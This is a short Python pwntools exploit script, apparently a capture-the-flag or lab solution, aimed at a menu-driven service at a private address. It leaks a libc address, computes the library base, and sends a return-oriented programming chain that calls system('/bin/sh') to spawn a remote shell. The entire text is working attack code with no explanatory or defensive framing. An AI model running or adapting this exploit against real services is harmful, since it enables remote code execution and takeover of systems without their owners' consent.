from pwn import *

lib = ELF("/lib/libc.so.6")
system_addr = lib.symbols['system']
sh_addr = lib.search('/bin/sh').next()
pop_rdi_call_rax = int("0xe912a", 16)
pop_rax_ret = int("0x365f8", 16)



r = remote("192.168.56.101", 6666)
print r.recvuntil("Exit\n:")
r.sendline('1')
data = r.recvuntil("Exit\n:")
print data
index = data.find("0x")
lib_base = int(data[index: index + 18], 16) + 0x1000
pop_rax_ret += lib_base     #old eip
system_addr += lib_base
pop_rdi_call_rax += lib_base
sh_addr += lib_base
print 'lib_base', hex(lib_base)
print "pop_rax_ret",hex(pop_rax_ret)
print "system_addr",hex(system_addr)
print "pop_rdi_call_rax",hex(pop_rdi_call_rax )
print "sh_addr",hex(sh_addr )



pay  = ''
pay += 'aaaaaaaa'
pay += p64(pop_rax_ret)
pay += p64(system_addr)
pay += p64(pop_rdi_call_rax)
pay += p64(sh_addr)

r.sendline("3")
print r.recvuntil(":")
r.sendline( str(len(pay) + 1) )
r.sendline(pay)
